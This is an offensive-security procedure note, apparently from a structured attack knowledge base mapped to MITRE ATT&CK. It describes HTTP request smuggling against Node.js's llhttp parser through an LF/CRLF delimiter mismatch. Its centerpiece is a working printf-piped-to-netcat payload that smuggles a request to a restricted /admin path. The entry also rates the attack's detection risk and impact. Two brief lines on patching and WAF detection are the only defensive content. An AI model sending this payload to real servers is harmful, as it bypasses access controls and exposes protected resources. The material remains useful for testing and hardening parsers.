---
tags:
  - http-smuggling
  - payload-crafting
  - web-exploit
type: procedure
tools:
  - '[[tools/Printf]]'
  - '[[tools/Netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/printf-nc-smuggling-payload]]'
platforms:
  - Web
  - Node.js
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7abb0d70-6457-48e6-a55d-d8e1ae3e83cc
created_at: '2025-12-13T09:01:17.382Z'
updated_at: '2025-12-13T09:01:17.382Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Send HTTP Request Smuggling Payload

## Summary

This procedure crafts a malicious HTTP request exploiting the LF delimiter mismatch in Node.js's llhttp parser and sends it to the target server to smuggle an additional request.

## Description

By using LF instead of CRLF in headers, the parser desynchronizes, interpreting subsequent data as a new request. This allows smuggling requests to restricted paths like /admin. The payload is constructed with printf and sent via nc to localhost:80.

## Requirements

1. Running Node.js HTTP server on port 80
2. Shell access for printf and nc
3. Knowledge of target headers and paths

## Defense

Defensive measures and detection strategies:

- Update Node.js to fix parser vulnerabilities
- Use WAF to detect invalid delimiters in requests

## Objectives

1. Exploit delimiter mismatch for request smuggling
2. Send payload to trigger desynchronization
3. Enable access to restricted resources

## Instructions

### Step 1: Construct and Transmit Payload

**Context**: This step builds the request with LF delimiters and pipes it to the server.

**Command** ([[commands/printf-nc-smuggling-payload]]):
```bash
(printf "GET / HTTP/1.1\r\nHost: localhost\r\nDummy: x\nContent-Length: 23\r\n\r\nGET / HTTP/1.1\r\nDummy: GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n\r\n") | nc localhost 80
```

> This command sends a request that the server sees as two: one to / and a smuggled one to /admin. Expected output: Server processes the requests separately.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/printf-nc-smuggling-payload]]

## Tools Used

- [[tools/Printf]]
- [[tools/Netcat]]

## Tags

- [[http-smuggling]]
- [[payload-crafting]]
